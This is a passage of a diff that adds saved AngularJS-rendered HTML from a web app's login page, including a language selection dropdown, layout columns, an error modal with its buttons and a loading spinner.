+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-66" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Ελληνικά</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-69" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Română</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-72" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Magyar</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-75" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Svenska</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-78" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Български</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-81" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Dansk</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-84" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Shqiptare</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-87" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Norsk</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages -->
+                            </div>
+	<div class="dropdown-options-down-container" ng-show="showDownArrow()" aria-hidden="true">
+		<div class="dropdown-options-down" ng-click="downArrowClicked()" ng-mouseenter="downArrowMouseenter()" ng-mouseleave="arrowMouseleave()" unselectable="on"><span class="fa fa-caret-down"></span></div>
+	</div>
+</div></dropdown-select>
+                        </div>
+                    </div>
+                </div>
+                <!-- ngIf: customSpaceStatus.LoginSocial -->
+            </div>
+            <div class="col-md-4 col-xs-2 col-sm-3" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-2 col-sm-3': !customSpaceSides}">
+                <!-- ngIf: customSpaceStatus.LoginRight -->
+            </div>
+			<div class="col-xs-12">
+                <!-- ngIf: customSpaceStatus.LoginBottom -->
+			</div>
+        </div>
+    </div>
+</div>
+<snapuser-directive snap-user="snapUser" class="ng-scope ng-isolate-scope"></snapuser-directive>
+</div>
+	<!-- ngInclude: undefined --><ng-include src="'components/topmodal/topmodal.html'" class="ng-scope"><div id="topModalContainer" class="ng-scope">
+	<!-- ngInclude: undefined -->
+	<div modal-body="errorMessage | translate" modal-directive="" modal-header="'LANG_ERROR' | translate" modal-id="'top-modal-error'" modal-closebtn="'LANG_CLOSE' | translate" class="ng-isolate-scope"><div id="top-modal-error" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="top-modal-error-label" aria-hidden="true" aria-describedby="top-modal-error-body top-modal-error-footer">
+	<div class="modal-dialog ng-isolate-scope" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<!-- ngIf: header --><h4 id="top-modal-error-label" ng-if="header" class="modal-title ng-binding ng-scope" ng-bind="header">Error!</h4><!-- end ngIf: header -->
+				<!-- ngIf: !header -->
+			</div>
+			<div id="top-modal-error-body">
+				<!-- ngIf: body -->
+				<!-- ngIf: bodyHtml -->
+				<div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+			</div>
+			<div class="modal-footer" id="top-modal-error-footer">
+				<!-- ngIf: footer || checkboxLabel -->
+				<button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding" data-ng-click="callbackbuttonclose()" data-dismiss="modal">Close</button>
+				<button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+				<button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+				<button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+				<button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+			</div>
+			<button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+				<span aria-hidden="true">×</span>
+			</button>
+		</div>
+	</div>
+</div>
+</div>
+</div>
+</ng-include>
+</div>
+</div>
+		<wcag-directive></wcag-directive>
+	</div><!-- end ngIf: !mobileDevice -->
+	<!-- ngIf: mobileDevice -->
+
+	<!-- Loading -->
+	<div ng-show="( isMobile !== true &amp;&amp; isMobile !== false )" class="loading-spinner-home loading-full-screen ng-hide">
+		<span class="fa fa-fw fa-cog fa-spin"></span>
+	</div>
+
+	<!-- used in util-audiofile-factory for IE hack for playing sounds -->
+	<div id="audiocnt"></div>
+
+
+
+
+</body></html>
